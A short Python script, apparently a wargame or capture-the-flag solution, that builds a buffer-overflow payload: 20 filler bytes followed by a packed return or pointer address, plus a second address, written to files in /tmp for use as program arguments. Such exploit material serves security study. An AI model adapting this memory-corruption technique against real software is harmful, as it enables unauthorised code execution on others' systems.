import struct

adresse = 0x8049928
adresse_little_endian = struct.pack("<I", adresse)

buffer = b"A" * 20

payload = buffer + adresse_little_endian

with open("/tmp/argv1", "wb") as f:
    f.write(payload)


adresse2 = 0x080484f4
adresse_little_endian2 = struct.pack("<I", adresse2)

with open("/tmp/argv2", "wb") as f:
    f.write(adresse_little_endian2)